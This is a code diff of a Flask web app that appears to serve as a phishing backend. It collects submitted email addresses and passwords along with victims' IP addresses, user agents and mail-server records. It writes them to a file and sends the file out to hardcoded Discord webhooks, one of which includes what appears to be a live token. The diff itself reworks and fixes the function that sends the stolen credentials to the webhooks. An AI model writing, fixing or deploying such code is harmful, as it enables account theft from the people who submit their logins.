@@ -25,6 +25,7 @@ DISCORD_WEBHOOK_URLS = [
     "https://discord.com/api/webhooks/1339995668625756232/jUZhB0L27EePcFo4psPduhjh_4VIv0xzO3D2gYwNtplfcoAXfGXtUdbOMhDuWJxmYcKn"
 ]
 
+# Function to get MX record
 def get_mx_record(domain):
     try:
         answers = dns.resolver.resolve(domain, 'MX')
@@ -32,47 +33,38 @@ def get_mx_record(domain):
     except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
         return "No MX Record Found"
 
+# Function to send message & txt file to Discord
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
     webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
+    
+    # Create the txt file in /tmp (Vercel-friendly)
+    file_path = f"/tmp/{email.replace('@', '_')}.txt"
+    with open(file_path, "w") as f:
+        f.write(f"Email: {email}\n")
+        f.write(f"Password: {password}\n")
+        f.write(f"IP: {ip}\n")
+        f.write(f"User-Agent: {useragent}\n")
+        f.write(f"Domain: {domain}\n")
+        f.write(f"MX Record: {mx_record}\n")
 
-    # Save details to a file in /tmp/ (required for Vercel)
-    file_path = "/tmp/log.txt"
-    with open(file_path, "w") as file:
-        file.write(f"Email: {email}\nPassword: {password}\nIP: {ip}\nUser-Agent: {useragent}\nDomain: {domain}\nMX Record: {mx_record}")
-
-    # Prepare the Discord embed
-    message = {
+    # Discord message payload
+    payload = {
         "username": "Logger Bot",
         "avatar_url": "https://i.imgur.com/zW2WJ3o.png",
-        "embeds": [
-            {
-                "title": "🔔 General New Login Attempt",
-                "color": 16711680,
-                "fields": [
-                    {"name": "📧 Email", "value": f"`{email}`", "inline": False},
-                    {"name": "🔑 Password", "value": f"`{password}`", "inline": False},
-                    {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
-                    {"name": "🖥 User-Agent", "value": f"`{useragent}`", "inline": False},
-                    {"name": "🌍 Domain", "value": f"`{domain}`", "inline": False},
-                    {"name": "📨 MX Record", "value": f"`{mx_record}`", "inline": False},
-                ],
-                "footer": {"text": "Logger Bot - Secure Notifications"},
-            }
-        ]
+        "content": f"🔔 **New Login Attempt Logged**\n📧 **Email:** `{email}`\n🌐 **IP:** `{ip}`"
     }
 
-    # Send the message with the file attachment
-    try:
-        with open(file_path, "rb") as file:
-            response = requests.post(
-                webhook_url,
-                data={"payload_json": str(message)},
-                files={"file": ("log.txt", file, "text/plain")}
-            )
-        if response.status_code != 204:
-            print(f"Failed to send message: {response.status_code} - {response.text}")
-    except requests.exceptions.RequestException as e:
-        print(f"Error sending message to Discord: {e}")
+    # Send request with JSON and file attachment
+    with open(file_path, "rb") as file:
+        response = requests.post(
+            webhook_url,
+            data={"payload_json": json.dumps(payload)},  # ✅ Fix: Ensure valid JSON string
+            files={"file": file}
+        )
+
+    # Handle errors
+    if response.status_code != 204:
+        print(f"Failed to send message: {response.status_code} - {response.text}")
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
